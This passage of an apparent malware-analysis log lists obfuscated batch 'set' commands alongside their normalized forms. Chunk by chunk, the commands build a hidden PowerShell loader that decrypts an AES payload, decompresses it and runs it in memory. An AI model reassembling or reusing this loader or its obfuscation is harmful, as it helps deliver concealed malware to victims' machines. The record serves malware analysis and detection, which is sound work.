\"%CuYg%\\\"mAvvKQGCEk%KWxq%-1..\\\"\", \"Normalized\": \"set \\\"mAvvKQGCEk=-1..\\\"\"}, {\"Command\": \"%CuYg%\\\"rVEVXmOnuP%KWxq%WXIl\\\"\", \"Normalized\": \"set \\\"rVEVXmOnuP=WXIl\\\"\"}, {\"Command\": \"%CuYg%\\\"TjqUpnRJHX%KWxq%IO.M\\\"\", \"Normalized\": \"set \\\"TjqUpnRJHX=IO.M\\\"\"}, {\"Command\": \"%CuYg%\\\"nBoIATefnx%KWxq%IO.C\\\"\", \"Normalized\": \"set \\\"nBoIATefnx=IO.C\\\"\"}, {\"Command\": \"%CuYg%\\\"ApKcMJqErB%KWxq%])))\\\"\", \"Normalized\": \"set \\\"ApKcMJqErB=])))\\\"\"}, {\"Command\": \"%CuYg%\\\"SHbKeuhmWj%KWxq%($mF\\\"\", \"Normalized\": \"set \\\"SHbKeuhmWj=($mF\\\"\"}, {\"Command\": \"%CuYg%\\\"kOiGTUXaLL%KWxq%'[-1\\\"\", \"Normalized\": \"set \\\"kOiGTUXaLL='[-1\\\"\"}, {\"Command\": \"%CuYg%\\\"qMIsrntlFq%KWxq%iron\\\"\", \"Normalized\": \"set \\\"qMIsrntlFq=iron\\\"\"}, {\"Command\": \"%CuYg%\\\"tAMBOHYgqq%KWxq%Bmor\\\"\", \"Normalized\": \"set \\\"tAMBOHYgqq=Bmor\\\"\"}, {\"Command\": \"%CuYg%\\\"oRXHAjSKSe%KWxq%rypt\\\"\", \"Normalized\": \"set \\\"oRXHAjSKSe=rypt\\\"\"}, {\"Command\": \"%CuYg%\\\"fjYUGjezip%KWxq%Obje\\\"\", \"Normalized\": \"set \\\"fjYUGjezip=Obje\\\"\"}, {\"Command\": \"%CuYg%\\\"IQcBiFoZpE%KWxq%:: '\\\"\", \"Normalized\": \"set \\\"IQcBiFoZpE=:: '\\\"\"}, {\"Command\": \"%CuYg%\\\"BvVdrhFSzX%KWxq%[-1.\\\"\", \"Normalized\": \"set \\\"BvVdrhFSzX=[-1.\\\"\"}, {\"Command\": \"%CuYg%\\\"XqsDlRFZqH%KWxq%($mF\\\"\", \"Normalized\": \"set \\\"XqsDlRFZqH=($mF\\\"\"}, {\"Command\": \"%CuYg%\\\"kjwUHfdNut%KWxq%Ao.L\\\"\", \"Normalized\": \"set \\\"kjwUHfdNut=Ao.L\\\"\"}, {\"Command\": \"%CuYg%\\\"QmLXiIzzOc%KWxq%2reE\\\"\", \"Normalized\": \"set \\\"QmLXiIzzOc=2reE\\\"\"}, {\"Command\": \"%CuYg%\\\"MeTdVBitah%KWxq%'gni\\\"\", \"Normalized\": \"set \\\"MeTdVBitah='gni\\\"\"}, {\"Command\": \"%CuYg%\\\"IoiAqaVMIU%KWxq%p by\\\"\", \"Normalized\": \"set \\\"IoiAqaVMIU=p by\\\"\"}, {\"Command\": \"%CuYg%\\\"CfaLzSyJwX%KWxq%cmij\\\"\", \"Normalized\": \"set \\\"CfaLzSyJwX=cmij\\\"\"}, {\"Command\": \"%CuYg%\\\"zLBGWMhUmK%KWxq%NAo,\\\"\", \"Normalized\": \"set \\\"zLBGWMhUmK=NAo,\\\"\"}, {\"Command\": \"%CuYg%\\\"upphBjwMmy%KWxq%fore\\\"\", \"Normalized\": \"set \\\"upphBjwMmy=fore\\\"\"}, {\"Command\": \"%CuYg%\\\"IosDLSzfht%KWxq%on.G\\\"\", \"Normalized\": \"set \\\"IosDLSzfht=on.G\\\"\"}, {\"Command\": \"%CuYg%\\\"UZNFdGPAxN%KWxq%t('\\\\\\\"\", \"Normalized\": \"set \\\"UZNFdGPAxN=t('\\\\\\\"\"}, {\"Command\": \"%CuYg%\\\"FmPCmVOnxB%KWxq%join\\\"\", \"Normalized\": \"set \\\"FmPCmVOnxB=join\\\"\"}, {\"Command\": \"%CuYg%\\\"sQlHBqZQhF%KWxq%$exb\\\"\", \"Normalized\": \"set \\\"sQlHBqZQhF=$exb\\\"\"}, {\"Command\": \"%CuYg%\\\"jCXmiFLAdG%KWxq%beoh\\\"\", \"Normalized\": \"set \\\"jCXmiFLAdG=beoh\\\"\"}, {\"Command\": \"%CuYg%\\\"NeJLyIiyRJ%KWxq%iphe\\\"\", \"Normalized\": \"set \\\"NeJLyIiyRJ=iphe\\\"\"}, {\"Command\": \"%CuYg%\\\"HCMxmsNCMY%KWxq%AesM\\\"\", \"Normalized\": \"set \\\"HCMxmsNCMY=AesM\\\"\"}, {\"Command\": \"%CuYg%\\\"ztypTGEofw%KWxq%ypto\\\"\", \"Normalized\": \"set \\\"ztypTGEofw=ypto\\\"\"}, {\"Command\": \"%CuYg%\\\"pgGFqJnloD%KWxq%spos\\\"\", \"Normalized\": \"set \\\"pgGFqJnloD=spos\\\"\"}, {\"Command\": \"%CuYg%\\\"OczBcMSnME%KWxq%.Tra\\\"\", \"Normalized\": \"set \\\"OczBcMSnME=.Tra\\\"\"}, {\"Command\": \"%CuYg%\\\"zfQBEiCRDT%KWxq%();$\\\"\", \"Normalized\": \"set \\\"zfQBEiCRDT=();$\\\"\"}, {\"Command\": \"%CuYg%\\\"QjYeoZgWgg%KWxq%);$e\\\"\", \"Normalized\": \"set \\\"QjYeoZgWgg=);$e\\\"\"}, {\"Command\": \"%CuYg%\\\"xVMAIaRmSn%KWxq%jc =\\\"\", \"Normalized\": \"set \\\"xVMAIaRmSn=jc =\\\"\"}, {\"Command\": \"%CuYg%\\\"jmsyfKLiHK%KWxq%TkGh\\\"\", \"Normalized\": \"set \\\"jmsyfKLiHK=TkGh\\\"\"}, {\"Command\": \"%CuYg%\\\"oAySAhqmFR%KWxq%mijf\\\"\", \"Normalized\": \"set \\\"oAySAhqmFR=mijf\\\"\"}, {\"Command\": \"%CuYg%\\\"uPrIlGjDRL%KWxq%('Lr\\\"\", \"Normalized\": \"set \\\"uPrIlGjDRL=('Lr\\\"\"}, {\"Command\": \"%CuYg%\\\"iXSvLcdBLM%KWxq%trea\\\"\", \"Normalized\": \"set \\\"iXSvLcdBLM=trea\\\"\"}, {\"Command\": \"%CuYg%\\\"iqBQUpLrKN%KWxq%cbcs\\\"\", \"Normalized\": \"set \\\"iqBQUpLrKN=cbcs\\\"\"}, {\"Command\": \"%CuYg%\\\"ThxBLlqCiX%KWxq%ed;$\\\"\", \"Normalized\": \"set \\\"ThxBLlqCiX=ed;$\\\"\"}, {\"Command\": \"%CuYg%\\\"IExkIrpzsZ%KWxq%md =\\\"\", \"Normalized\": \"set \\\"IExkIrpzsZ=md =\\\"\"}, {\"Command\": \"%CuYg%\\\"sAIuOFnjDH%KWxq%ZipS\\\"\", \"Normalized\": \"set \\\"sAIuOFnjDH=ZipS\\\"\"}, {\"Command\": \"%CuYg%\\\"qBoTrkrQCD%KWxq%ream\\\"\", \"Normalized\": \"set \\\"qBoTrkrQCD=ream\\\"\"}, {\"Command\": \"%CuYg%\\\"sqUZNaKiTf%KWxq%')([\\\"\", \"Normalized\": \"set \\\"sqUZNaKiTf=')([\\\"\"}, {\"Command\": \"%CuYg%\\\"IPvppKfUQn%KWxq%-w h\\\"\", \"Normalized\": \"set \\\"IPvppKfUQn=-w h\\\"\"}, {\"Command\": \"%CuYg%\\\"lLcgZXdXHV%KWxq%engt\\\"\", \"Normalized\": \"set \\\"lLcgZXdXHV=engt\\\"\"}, {\"Command\": \"%CuYg%\\\"YPpcgDhnpS%KWxq%);$u\\\"\", \"Normalized\": \"set \\\"YPpcgDhnpS=);$u\\\"\"}, {\"Command\": \"%CuYg%\\\"WkXISKlJsz%KWxq%semb\\\"\", \"Normalized\": \"set \\\"WkXISKlJsz=semb\\\"\"}, {\"Command\": \"%CuYg%\\\"xjtUGuoBoB%KWxq%pose\\\"\", \"Normalized\": \"set \\\"xjtUGuoBoB=pose\\\"\"}, {\"Command\": \"%CuYg%\\\"vNaelsYiWJ%KWxq%'[-1\\\"\", \"Normalized\": \"set \\\"vNaelsYiWJ='[-1\\\"\"}, {\"Command\": \"%CuYg%\\\"FQHGMlkMeL%KWxq%ment\\\"\", \"Normalized\": \"set \\\"FQHGMlkMeL=ment\\\"\"}, {\"Command\": \"%CuYg%\\\"JxeIOmBpJa%KWxq%;$ex\\\"\", \"Normalized\": \"set \\\"JxeIOmBpJa=;$ex\\\"\"}, {\"Command\": \"%CuYg%\\\"aJusToFwpe%KWxq%'%*'\\\"\", \"Normalized\": \"set \\\"aJusToFwpe=''\\\"\"}, {\"Command\": \"%CuYg%\\\"EhYfuSXgYB%KWxq%.Con\\\"\", \"Normalized\": \"set \\\"EhYfuSXgYB=.Con\\\"\"}, {\"Command\": \"%CuYg%\\\"zWdaTJJVFT%KWxq%emor\\\"\", \"Normalized\": \"set \\\"zWdaTJJVFT=emor\\\"\"}, {\"Command\": \"%CuYg%\\\"rWcKiOvahG%KWxq%ssio\\\"\", \"Normalized\": \"set \\\"rWcKiOvahG=ssio\\\"\"}, {\"Command\": \"%CuYg%\\\"IYGpcxClgh%KWxq%morF\\\"\", \"Normalized\": \"set \\\"IYGpcxClgh=morF\\\"\"}, {\"Command\": \"%CuYg%\\\"hmxJkcgnoj%KWxq%mpre\\\"\", \"Normalized\": \"set \\\"hmxJkcgnoj=mpre\\\"\"}, {\"Command\": \"%CuYg%\\\"IEXYJdAUJf%KWxq%ogra\\\"\", \"Normalized\": \"set \\\"IEXYJdAUJf=ogra\\\"\"}, {\"Command\": \"%CuYg%\\\"LpoElfRpLG%KWxq%ing[\\\"\", \"Normalized\": \"set \\\"LpoElfRpLG=ing[\\\"\"}, {\"Command\": \"%CuYg%\\\"CcMgeiuODL%KWxq%TllA\\\"\", \"Normalized\": \"set \\\"CcMgeiuODL=TllA\\\"\"}, {\"Command\": \"%CuYg%\\\"yUgRDQODfA%KWxq% [Sy\\\"\", \"Normalized\": \"set \\\"yUgRDQODfA= [Sy\\\"\"}, {\"Command\": \"%CuYg%\\\"OHNXqIJsJA%KWxq%m.Se\\\"\", \"Normalized\": \"set \\\"OHNXqIJsJA=m.Se\\\"\"}, {\"Command\": \"%CuYg%\\\"PLkfEEHLjl%KWxq%kw.D\\\"\", \"Normalized\": \"set \\\"PLkfEEHLjl=kw.D\\\"\"}, {\"Command\": \"%CuYg%\\\"kIlrFPDnDf%KWxq%$XTg\\\"\", \"Normalized\": \"set \\\"kIlrFPDnDf=$XTg\\\"\"}, {\"Command\": \"%CuYg%\\\"lXpKnajcUB%KWxq%$mFN\\\"\", \"Normalized\": \"set \\\"lXpKnajcUB=$mFN\\\"\"}, {\"Command\": \"%CuYg%\\\"svWHjTtSxy%KWxq%;$uN\\\"\", \"Normalized\": \"set \\\"svWHjTtSxy=;$uN\\\"\"}, {\"Command\": \"%CuYg%\\\"IpietBALEU%KWxq%);$c\\\"\", \"Normalized\": \"set \\\"IpietBALEU=);$c\\\"\"}, {\"Command\": \"%CuYg%\\\"uDgLYBvQsV%KWxq%h);$\\\"\", \"Normalized\": \"set \\\"uDgLYBvQsV=h);$\\\"\"}, {\"Command\": \"%CuYg%\\\"qfrivoSOtu%KWxq%r();\\\"\", \"Normalized\": \"set \\\"qfrivoSOtu=r();\\\"\"}, {\"Command\": \"%CuYg%\\\"PNNqoSRJWU%KWxq%ispo\\\"\", \"Normalized\": \"set \\\"PNNqoSRJWU=ispo\\\"\"}, {\"Command\": \"%CuYg%\\\"KePeTTnjUP%KWxq%, $m\\\"\", \"Normalized\": \"set \\\"KePeTTnjUP=, $m\\\"\"}, {\"Command\": \"%CuYg%\\\"tkSsZvXQmf%KWxq%cwxL\\\"\", \"Normalized\": \"set \\\"tkSsZvXQmf=cwxL\\\"\"}, {\"Command\": \"%CuYg%\\\"bSvfVvnYob%KWxq% = $\\\"\", \"Normalized\": \"set \\\"bSvfVvnYob= = $\\\"\"}, {\"Command\": \"%CuYg%\\\"QGzVHaAEAJ%KWxq%ull;\\\"\", \"Normalized\": \"set \\\"QGzVHaAEAJ=ull;\\\"\"}, {\"Command\": \"%CuYg%\\\"lmgKVSxUOu%KWxq%1..-\\\"\", \"Normalized\": \"set \\\"lmgKVSxUOu=1..-\\\"\"}, {\"Command\": \"%CuYg%\\\"FaRGIeOpRS%KWxq%;}fu\\\"\", \"Normalized\": \"set \\\"FaRGIeOpRS=;}fu\\\"\"}, {\"Command\": \"%CuYg%\\\"hlrmvhjhEI%KWxq%pQ.C\\\"\", \"Normalized\": \"set \\\"hlrmvhjhEI=pQ.C\\\"\"}, {\"Command\": \"%CuYg%\\\"bmBqltbhGl%KWxq%ty.C\\\"\", \"Normalized\": \"set \\\"bmBqltbhGl=ty.C\\\"\"}, {\"Command\": \"%CuYg%\\\"gJNjcFSLDe%KWxq%onve\\\"\", \"Normalized\": \"set \\\"gJNjcFSLDe=onve\\\"\"}, {\"Command\": \"%CuYg%\\\"bVEddiZDgl%KWxq% 0, \\\"\", \"Normalized\": \"set \\\"bVEddiZDgl= 0, \\\"\"}, {\"Command\": \"%CuYg%\\\"PaQRVdYhEa%KWxq%t]::\\\"\", \"Normalized\": \"set \\\"PaQRVdYhEa=t]::\\\"\"}, {\"Command\": \"%CuYg%\\\"ChDVpCdVUe%KWxq%ctio\\\"\", \"Normalized\": \"set \\\"ChDVpCdVUe=ctio\\\"\"}, {\"Command\": \"%CuYg%\\\"QhCswdTCfC%KWxq%$fzu\\\"\", \"Normalized\": \"set \\\"QhCswdTCfC=$fzu\\\"\"}, {\"Command\": \"%CuYg%\\\"hstvLhynpq%KWxq%Deco\\\"\", \"Normalized\": \"set \\\"hstvLhynpq=Deco\\\"\"}, {\"Command\": \"%CuYg%\\\"uwRLOqUItZ%KWxq%ject\\\"\", \"Normalized\": \"set \\\"uwRLOqUItZ=ject\\\"\"}, {\"Command\": \"%CuYg%\\\"sloDrTyzkV%KWxq%ion \\\"\", \"Normalized\": \"set \\\"sloDrTyzkV=ion \\\"\"}, {\"Command\": \"%CuYg%\\\"FTLlJgFVuX%KWxq%Poin\\\"\", \"Normalized\": \"set \\\"FTLlJgFVuX=Poin\\\"\"}, {\"Command\": \"%CuYg%\\\"XmuZgGdKWf%KWxq%spos\\\"\", \"Normalized\": \"set \\\"XmuZgGdKWf=spos\\\"\"}, {\"Command\": \"%CuYg%\\\"mAqkHrpech%KWxq%S46e\\\"\", \"Normalized\": \"set \\\"mAqkHrpech=S46e\\\"\"}, {\"Command\": \"%CuYg%\\\"XbuRpePuvi%KWxq%EcC \\\"\", \"Normalized\": \"set \\\"XbuRpePuvi=EcC \\\"\"}, {\"Command\": \"%CuYg%\\\"KTpgLfaxYj%KWxq% if \\\"\", \"Normalized\": \"set \\\"KTpgLfaxYj= if \\\"\"}, {\"Command\": \"%CuYg%\\\"tBqOpPbHVL%KWxq%join\\\"\", \"Normalized\": \"set \\\"tBqOpPbHVL=join\\\"\"}, {\"Command\": \"%CuYg%\\\"QOmOBdKOGQ%KWxq%I) {\\\"\", \"Normalized\": \"set \\\"QOmOBdKOGQ=I) {\\\"\"}, {\"Command\": \"%CuYg%\\\"JDSFpANMPG%KWxq% $Wt\\\"\", \"Normalized\": \"set \\\"JDSFpANMPG= $Wt\\\"\"}, {\"Command\": \"%CuYg%\\\"DPZbURzVYe%KWxq%::('\\\"\", \"Normalized\": \"set \\\"DPZbURzVYe=::('\\\"\"}, {\"Command\": \"%CuYg%\\\"IxAgvhZmEk%KWxq%stem\\\"\", \"Normalized\": \"set \\\"IxAgvhZmEk=stem\\\"\"}, {\"Command\": \"%CuYg%\\\"IdEQBkPeaM%KWxq% ([S\\\"\", \"Normalized\": \"set \\\"IdEQBkPeaM= ([S\\\"\"}, {\"Command\": \"%CuYg%\\\"RInpJnksCY%KWxq%L = \\\"\", \"Normalized\": \"set \\\"RInpJnksCY=L = \\\"\"}, {\"Command\": \"%CuYg%\\\"RAvMjaRyLi%KWxq%irtS\\\"\", \"Normalized\": \"set \\\"RAvMjaRyLi=irtS\\\"\"}, {\"Command\": \"%CuYg%\\\"jKknhjURKh%KWxq%curi\\\"\", \"Normalized\": \"set \\\"jKknhjURKh=curi\\\"\"}, {\"Command\": \"%CuYg%\\\"mFMiPlPcwd%KWxq%){$s\\\"\", \"Normalized\": \"set \\\"mFMiPlPcwd=){$s\\\"\"}, {\"Command\": \"%CuYg%\\\"uKLNsLGkvX%KWxq%turn\\\"\", \"Normalized\": \"set \\\"uKLNsLGkvX=turn\\\"\"}, {\"Command\": \"%CuYg%\\\"ASynihEyfo%KWxq%.IO.\\\"\", \"Normalized\": \"set \\\"ASynihEyfo=.IO.\\\"\"}, {\"Command\": \"%CuYg%\\\"wcanrWZKHP%KWxq% cbc\\\"\", \"Normalized\": \"set \\\"wcanrWZKHP= cbc\\\"\"}, {\"Command\": \"%CuYg%\\\"TLFGuiAjed%KWxq%idde\\\"\", \"Normalized\": \"set \\\"TLFGuiAjed=idde\\\"\"}, {\"Command\": \"%CuYg%\\\"mUrsJxEHOZ%KWxq%A=')\\\"\", \"Normalized\": \"set \\\"mUrsJxEHOZ=A=')\\\"\"}, {\"Command\": \"%CuYg%\\\"PJYVALpSMX%KWxq%in $\\\"\", \"Normalized\": \"set \\\"PJYVALpSMX=in $\\\"\"}, {\"Command\": \"%CuYg%\\\"JmuzQfLqHh%KWxq%e();\\\"\", \"Normalized\": \"set \\\"JmuzQfLqHh=e();\\\"\"}, {\"Command\": \"%CuYg%\\\"ofmVYOwNls%KWxq% = $\\\"\", \"Normalized\": \"set \\\"ofmVYOwNls= = $\\\"\"}, {\"Command\": \"%CuYg%\\\"lGCcMZHtLn%KWxq%addi\\\"\", \"Normalized\": \"set \\\"lGCcMZHtLn=addi\\\"\"}, {\"Command\": \"%CuYg%\\\"RJVKYMNpMK%KWxq%addi\\\"\", \"Normalized\": \"set \\\"RJVKYMNpMK=addi\\\"\"}, {\"Command\": \"%CuYg%\\\"SblpPDvcUy%KWxq%n -e\\\"\", \"Normalized\": \"set \\\"SblpPDvcUy=n -e\\\"\"}, {\"Command\": \"%CuYg%\\\"lhNeOhEJVF%KWxq%IL.P\\\"\", \"Normalized\": \"set \\\"lhNeOhEJVF=IL.P\\\"\"}, {\"Command\": \"%CuYg%\\\"BFDtBECcYr%KWxq%zpVA\\\"\", \"Normalized\": \"set \\\"BFDtBECcYr=zpVA\\\"\"}, {\"Command\": \"%CuYg%\\\"ilMoAEXQBI%KWxq% -jo\\\"\", \"Normalized\": \"set \\\"ilMoAEXQBI= -jo\\\"\"}, {\"Command\": \"%CuYg%\\\"rNDIhCpazh%KWxq%$cwx\\\"\", \"Normalized\": \"set \\\"rNDIhCpazh=$cwx\\\"\"}, {\"Command\": \"%CuYg%\\\"PYuuUPxpFo%KWxq%O.Co\\\"\", \"Normalized\": \"set \\\"PYuuUPxpFo=O.Co\\\"\"}, {\"Command\": \"%CuYg%\\\"MkVOsrfmkR%KWxq%S8jN\\\"\", \"Normalized\": \"set \\\"MkVOsrfmkR=S8jN\\\"\"}, {\"Command\": \"%CuYg%\\\"ocZsEEDeqt%KWxq%func\\\"\", \"Normalized\": \"set \\\"ocZsEEDeqt=func\\\"\"}, {\"Command\": \"%CuYg%\\\"bkuPVWlcir%KWxq% [Sy\\\"\", \"Normalized\": \"set \\\"bkuPVWlcir= [Sy\\\"\"}, {\"Command\": \"%CuYg%\\\"ujPeDEAQoS%KWxq%urn_\\\"\", \"Normalized\": \"set \\\"ujPeDEAQoS=urn_\\\"\"}, {\"Command\": \"%CuYg%\\\"XCHTImhwMH%KWxq%CBC;\\\"\", \"Normalized\": \"set \\\"XCHTImhwMH=CBC;\\\"\"}, {\"Command\": \"%CuYg%\\\"yalwUhseWz%KWxq%UzNc\\\"\", \"Normalized\": \"set \\\"yalwUhseWz=UzNc\\\"\"}, {\"Command\": \"%CuYg%\\\"WnNVrVshUs%KWxq% = N\\\"\", \"Normalized\": \"set \\\"WnNVrVshUs= = N\\\"\"}, {\"Command\": \"%CuYg%\\\"uWHnxQVgrF%KWxq%3Udz\\\"\", \"Normalized\": \"set \\\"uWHnxQVgrF=3Udz\\\"\"}, {\"Command\": \"%CuYg%\\\"NvEwsFRrTJ%KWxq%pass\\\"\", \"Normalized\": \"set \\\"NvEwsFRrTJ=pass\\\"\"}, {\"Command\": \"%CuYg%\\\"wBXuCgxiIx%KWxq%l, $\\\"\", \"Normalized\": \"set \\\"wBXuCgxiIx=l, $\\\"\"}, {\"Command\": \"%CuYg%\\\"aONNQXCxMT%KWxq%C.Su\\\"\", \"Normalized\": \"set \\\"aONNQXCxMT=C.Su\\\"\"}, {\"Command\": \"%CuYg%\\\"uaRhZNrgqT%KWxq%.Sec\\\"\", \"Normalized\": \"set \\\"uaRhZNrgqT=.Sec\\\"\"}, {\"Command\": \"%CuYg%\\\"uiIwAdIHzB%KWxq% = [\\\"\", \"Normalized\": \"set \\\"uiIwAdIHzB= = [\\\"\"}, {\"Command\": \"%CuYg%\\\"OTOtGEsozM%KWxq%$sgG\\\"\", \"Normalized\": \"set \\\"OTOtGEsozM=$sgG\\\"\"}, {\"Command\": \"%CuYg%\\\"fmiNazViKq%KWxq%f.Di\\\"\", \"Normalized\": \"set \\\"fmiNazViKq=f.Di\\\"\"}, {\"Command\": \"%CuYg%\\\"AdVJZDLQnc%KWxq%JBWk\\\"\", \"Normalized\": \"set \\\"AdVJZDLQnc=JBWk\\\"\"}, {\"Command\": \"%CuYg%\\\"cvYWxgSzLr%KWxq%iXJI\\\"\", \"Normalized\": \"set \\\"cvYWxgSzLr=iXJI\\\"\"}, {\"Command\": \"%CuYg%\\\"PZsyUwtIzy%KWxq%($gE\\\"\", \"Normalized\": \"set \\\"PZsyUwtIzy=($gE\\\"\"}, {\"Command\": \"%CuYg%\\\"qYJhtLHrvt%KWxq%.-4]\\\"\", \"Normalized\": \"set \\\"qYJhtLHrvt=.-4]\\\"\"}, {\"Command\": \"%CuYg%\\\"OdNSMzEYhp%KWxq%.Dis\\\"\", \"Normalized\": \"set \\\"OdNSMzEYhp=.Dis\\\"\"}, {\"Command\": \"%CuYg%\\\"zywCJTPqXy%KWxq%Fbeo\\\"\", \"Normalized\": \"set \\\"zywCJTPqXy=Fbeo\\\"\"}, {\"Command\": \"%CuYg%\\\"ztAJPivsLy%KWxq%$iXJ\\\"\", \"Normalized\": \"set \\\"ztAJPivsLy=$iXJ\\\"\"}, {\"Command\": \"%CuYg%\\\"bWNxpidIug%KWxq%')($\\\"\", \"Normalized\": \"set \\\"bWNxpidIug=')($\\\"\"}, {\"Command\": \"%CuYg%\\\"AGwjysosXN%KWxq%ject\\\"\", \"Normalized\": \"set \\\"AGwjysosXN=ject\\\"\"}, {\"Command\": \"%CuYg%\\\"GZLyvnqgqI%KWxq%CuNP\\\"\", \"Normalized\": \"set \\\"GZLyvnqgqI=CuNP\\\"\"}, {\"Command\": \"%CuYg%\\\"fYYaQkHGUt%KWxq%saBm\\\"\", \"Normalized\": \"set \\\"fYYaQkHGUt=saBm\\\"\"}, {\"Command\": \"%CuYg%\\\"aSZWFKCFQW%KWxq% (, \\\"\", \"Normalized\": \"set \\\"aSZWFKCFQW= (, \\\"\"}, {\"Command\": \"%CuYg%\\\"pmaSomEMvF%KWxq%6Qs3\\\"\", \"Normalized\": \"set \\\"pmaSomEMvF=6Qs3\\\"\"}, {\"Command\": \"%CuYg%\\\"ZifZuYtQGx%KWxq%A.Di\\\"\", \"Normalized\": \"set \\\"ZifZuYtQGx=A.Di\\\"\"}, {\"Command\": \"%CuYg%\\\"gxPHNUqkPO%KWxq%ng =\\\"\", \"Normalized\": \"set \\\"gxPHNUqkPO=ng =\\\"\"}, {\"Command\": \"%CuYg%\\\"DPRpRVZLNw%KWxq%stem\\\"\", \"Normalized\": \"set \\\"DPRpRVZLNw=stem\\\"\"}, {\"Command\": \"%CuYg%\\\"NqcONlNFAM%KWxq%bjec\\\"\", \"Normalized\": \"set \\\"NqcONlNFAM=bjec\\\"\"}, {\"Command\": \"%CuYg%\\\"EWWBLpGxUt%KWxq%c = \\\"\", \"Normalized\": \"set \\\"EWWBLpGxUt=c = \\\"\"}, {\"Command\": \"%CuYg%\\\"ywAnCaznKU%KWxq%orF'\\\"\", \"Normalized\": \"set \\\"ywAnCaznKU=orF'\\\"\"}, {\"Command\": \"%CuYg%\\\"VSXRNLDvKz%KWxq%));\\\"\", \"Normalized\": \"set \\\"VSXRNLDvKz=));\\\"\"}, {\"Command\": \"%CuYg%\\\"IehHIdWqIM%KWxq%efle\\\"\", \"Normalized\": \"set \\\"IehHIdWqIM=efle\\\"\"}, {\"Command\": \"%CuYg%\\\"eGOuXHDfAL%KWxq% -c \\\"\", \"Normalized\": \"set \\\"eGOuXHDfAL= -c \\\"\"}, {\"Command\": \"%CuYg%\\\"KvxBYPNBmY%KWxq%:PKC\\\"\", \"Normalized\": \"set \\\"KvxBYPNBmY=:PKC\\\"\"}, {\"Command\": \"%CuYg%\\\"OXQTDLBYpZ%KWxq%tem.\\\"\", \"Normalized\": \"set \\\"OXQTDLBYpZ=tem.\\\"\"}, {\"Command\": \"%CuYg%\\\"rkYGywpDGi%KWxq%anag\\\"\", \"Normalized\": \"set \\\"rkYGywpDGi=anag\\\"\"}, {\"Command\": \"%CuYg%\\\"ekxMXNuAcV%KWxq%essi\\\"\", \"Normalized\": \"set \\\"ekxMXNuAcV=essi\\\"\"}, {\"Command\": \"%CuYg%\\\"UQcgvfgxKR%KWxq%em.R\\\"\", \"Normalized\": \"set \\\"UQcgvfgxKR=em.R\\\"\"}, {\"Command\": \"%CuYg%\\\"WUTjbyoIlU%KWxq%nsfo\\\"\", \"Normalized\": \"set \\\"WUTjbyoIlU=nsfo\\\"\"}, {\"Command\": \"%CuYg%\\\"hXqfueLFZj%KWxq%NAo)\\\"\", \"Normalized\": \"set \\\"hXqfueLFZj=NAo)\\\"\"}, {\"Command\": \"%CuYg%\\\"PmYSoPSXvC%KWxq%uJBW\\\"\", \"Normalized\": \"set \\\"PmYSoPSXvC=uJBW\\\"\"}, {\"Command\": \"%CuYg%\\\"NBEShZVxdI%KWxq%RuXS\\\"\", \"Normalized\": \"set \\\"NBEShZVxdI=RuXS\\\"\"}, {\"Command\": \"%CuYg%\\\"qVQbOHyMQg%KWxq%= Ne\\\"\", \"Normalized\": \"set \\\"qVQbOHyMQg== Ne\\\"\"}, {\"Command\": \"%CuYg%\\\"KTzJwfHoTA%KWxq%byte\\\"\", \"Normalized\": \"set \\\"KTzJwfHoTA=byte\\\"\"}, {\"Command\": \"%CuYg%\\\"pznkrkYcSg%KWxq%46es\\\"\", \"Normalized\": \"set \\\"pznkrkYcSg=46es\\\"\"}, {\"Command\": \"%CuYg%\\\"WpbgaGlUgP%KWxq%k);}\\\"\", \"Normalized\": \"set \\\"WpbgaGlUgP=k);}\\\"\"}, {\"Command\": \"%CuYg%\\\"zsgzvBksnU%KWxq%ypto\\\"\", \"Normalized\": \"set \\\"zsgzvBksnU=ypto\\\"\"}, {\"Command\": \"%CuYg%\\\"YeDLTjgsYc%KWxq%lit(\\\"\", \"Normalized\": \"set \\\"YeDLTjgsYc=lit(\\\"\"}, {\"Command\": \"%CuYg%\\\"evHTLasVFk%KWxq%\\\"%~0.\\\"\", \"Normalized\": \"set \\\"evHTLasVFk=\\\"script.bat.\\\"\"}, {\"Command\": \"%CuYg%\\\"atqNdyhGqZ%KWxq% -no\\\"\", \"Normalized\": \"set \\\"atqNdyhGqZ= -no\\\"\"}, {\"Command\": \"%CuYg%\\\"rQikqWbgZL%KWxq%grap\\\"\", \"Normalized\": \"set \\\"rQikqWbgZL=grap\\\"\"}, {\"Command\": \"%CuYg%\\\"rdRvdGyZCw%KWxq%YwYY\\\"\", \"Normalized\": \"set \\\"rdRvdGyZCw=YwYY\\\"\"}, {\"Command\": \"%CuYg%\\\"kIfMnpvQvj%KWxq%$fzu\\\"\", \"Normalized\": \"set \\\"kIfMnpvQvj=$fzu\\\"\"}, {\"Command\": \"%CuYg%\\\"uDUOhlPuyE%KWxq%.Inv\\\"\", \"Normalized\": \"set \\\"uDUOhlPuyE=.Inv\\\"\"}, {\"Command\": \"%CuYg%\\\"BisBCfewMw%KWxq%nirt\\\"\", \"Normalized\": \"set \\\"BisBCfewMw=nirt\\\"\"}, {\"Command\": \"%CuYg%\\\"qYhLNpeVWc%KWxq%L.Mo\\\"\", \"Normalized\": \"set \\\"qYhLNpeVWc=L.Mo\\\"\"}, {\"Command\": \"%CuYg%\\\"mHrINttEHj%KWxq%z58e\\\"\", \"Normalized\": \"set \\\"mHrINttEHj=z58e\\\"\"}, {\"Command\": \"%CuYg%\\\"qMwQKbLBlt%KWxq%_var\\\"\", \"Normalized\": \"set \\\"qMwQKbLBlt=_var\\\"\"}, {\"Command\": \"%CuYg%\\\"gcMGNTCuio%KWxq%GzhX\\\"\", \"Normalized\": \"set \\\"gcMGNTCuio=GzhX\\\"\"}, {\"Command\": \"%CuYg%\\\"fAGhKJjPYY%KWxq%VH.E\\\"\", \"Normalized\": \"set \\\"fAGhKJjPYY=VH.E\\\"\"}, {\"Command\": \"%CuYg%\\\"KsXQJEHwxs%KWxq%t;$W\\\"\", \"Normalized\": \"set \\\"KsXQJEHwxs=t;$W\\\"\"}, {\"Command\": \"%CuYg%\\\"AdBuzCgwLW%KWxq%phy.\\\"\", \"Normalized\": \"set \\\"AdBuzCgwLW=phy.\\\"\"}, {\"Command\": \"%CuYg%\\\"RvdSghNJoz%KWxq%4NiL\\\"\", \"Normalized\": \"set \\\"RvdSghNJoz=4NiL\\\"\"}, {\"Command\": \"%CuYg%\\\"rHWVsfIbGl%KWxq%hy.C\\\"\", \"Normalized\": \"set \\\"rHWVsfIbGl=hy.C\\\"\"}, {\"Command\": \"%CuYg%\\\"jPiqZkTOYC%KWxq%o){$\\\"\", \"Normalized\": \"set 